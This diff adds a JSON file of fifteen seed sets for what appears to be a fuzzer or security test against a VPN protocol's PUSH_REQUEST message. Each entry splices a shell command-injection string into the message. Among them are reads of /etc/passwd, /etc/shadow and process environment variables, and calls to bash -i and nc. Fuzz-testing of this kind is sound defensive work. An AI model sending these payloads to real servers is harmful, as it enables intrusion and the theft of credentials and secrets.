@@ -1,0 +1,107 @@
+{
+  "S1": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST;id;", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 12, "val": "`id`", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 16, "val": "$(whoami)", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 12, "val": "|cat /etc/passwd", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST||ls", "op": "r", "size": "-"}
+  ],
+  "S2": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST\x00;id;", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": "`whoami`", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": "&&ls", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST||ping", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 16, "val": ";cat /etc/shadow", "op": "i", "size": "-"}
+  ],
+  "S3": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST;echo", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 15, "val": "`bash -i`", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 15, "val": "&&id", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST||nc", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": ";uname -a", "op": "i", "size": "-"}
+  ],
+  "S4": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST$()", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 15, "val": "`whoami`", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 15, "val": "||ls", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST;id", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": "$(cat /etc/passwd)", "op": "i", "size": "-"}
+  ],
+  "S5": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST\x00;", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": "id", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 15, "val": "`ls -la`", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST||", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": ";ping -c 1", "op": "i", "size": "-"}
+  ],
+  "S6": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST;", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": "`env`", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": "&&whoami", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST||echo", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 15, "val": ";cat /proc/self/environ", "op": "i", "size": "-"}
+  ],
+  "S7": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST`", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 14, "val": "id;", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 17, "val": "||ls", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST;", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": "`uname -a`", "op": "i", "size": "-"}
+  ],
+  "S8": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST\x00\x00;", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 14, "val": "whoami", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 19, "val": "||cat", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST;", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": "&&id", "op": "i", "size": "-"}
+  ],
+  "S9": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST;", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": ";ls", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 15, "val": "`echo test`", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST|", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": "||id", "op": "i", "size": "-"}
+  ],
+  "S10": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST||", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 15, "val": ";id", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 17, "val": "`whoami`", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST;", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": "&&cat /etc/passwd", "op": "i", "size": "-"}
+  ],
+  "S11": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST;", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": "id;", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 15, "val": "`touch /tmp/pwned`", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST||id", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": ";ls -la", "op": "i", "size": "-"}
+  ],
+  "S12": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST\x00;", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": "||id", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 16, "val": "`ls /`", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST;", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": "&&whoami", "op": "i", "size": "-"}
+  ],
+  "S13": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST;", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": "||ls", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 16, "val": ";echo", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST||", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 15, "val": "`id`", "op": "i", "size": "-"}
+  ],
+  "S14": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST;", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": "&&id", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 16, "val": "||cat", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST\x00\x00;", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 14, "val": "`uname -a`", "op": "i", "size": "-"}
+  ],
+  "S15": [
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST||", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 15, "val": ";id", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 17, "val": "&&echo", "op": "i", "size": "-"},
+    {"msg": "M17", "offset": 0, "val": "PUSH_REQUEST;", "op": "r", "size": "-"},
+    {"msg": "M17", "offset": 13, "val": "`cat /etc/shadow`", "op": "i", "size": "-"}
+  ]
+}
